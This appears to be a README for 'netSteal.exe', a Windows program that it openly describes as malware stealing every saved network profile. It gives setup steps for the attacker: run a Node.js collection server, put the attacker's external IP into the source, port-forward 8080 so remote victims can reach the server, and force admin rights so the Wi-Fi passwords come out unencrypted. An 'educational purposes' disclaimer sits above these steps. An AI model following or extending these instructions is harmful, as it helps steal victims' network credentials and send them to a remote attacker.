**DO NOT USE THIS PROGRAM TO DO ANYTHING HARMFUL OR ILLEGAL. I WILL NOT BE HELD RESPONSIBLE. THIS IS PURELY FOR EDUCATIONAL PURPOSES ONLY.**
# netSteal.exe
Malware that steals all saved network profiles.

**Requirements**
[Node.js](https://nodejs.org/)
[C++ compiler](https://visualstudio.microsoft.com/)
[NPM](https://www.npmjs.com/)

**Setting Up Server**
Run ``node server.js`` in your terminal (you need to port forword 8080 if the user is not on your network)

**Setting up netSteal.exe**
1. Replace <SERVER ADDRESS> on line 55 with your external IPv4 and port number. EX: 12.123.12.123:8080
2. Make program require admin, without admin passwords will be encrypted - [How?](https://i.stack.imgur.com/OeiCu.png)
5. Compile into .exe

**Problems**\
Please note that netSteal.exe only works on recent **Windows** versions.\
If the user is not on the same network as you, you need to [port forward](https://www.noip.com/support/knowledgebase/general-port-forwarding-guide/) 8080